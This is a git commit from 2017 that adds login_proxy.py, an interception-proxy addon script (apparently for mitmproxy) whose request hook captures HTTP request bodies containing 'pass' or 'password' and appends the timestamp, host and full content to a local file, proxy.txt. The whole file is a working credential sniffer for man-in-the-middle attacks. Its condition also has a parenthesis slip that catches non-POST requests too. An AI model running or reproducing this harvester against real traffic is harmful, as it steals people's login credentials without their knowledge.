fd15eff7f0eea1849c2ba16e0ed0ebdda71ec460
sarah314 <31287043+sarah314@users.noreply.github.com>
2017-08-23 20:20:52 +0200

    Create login_proxy.py

---
+++ Code/login_proxy.py
@@ -0,0 +1,19 @@
+# Sarah M. - 2017
+
+import sys
+import datetime
+from colors import farben
+
+def request(flow):
+    now = datetime.datetime.now()
+    content = flow.request.get_text()
+    host = flow.request.pretty_host
+    method = flow.request.method
+    if method == "POST" and ("pass" in content) or ("password" in content) :
+        with open ("proxy.txt", "a") as myfile:
+            myfile.write(farben.AUF + str(now) +" // " + farben.END)
+            myfile.write(farben.LD + host + farben.END)
+            myfile.write("\n")
+            myfile.write(farben.KG + content + farben.END)
+            myfile.write("\n")
+            myfile.write("\n")
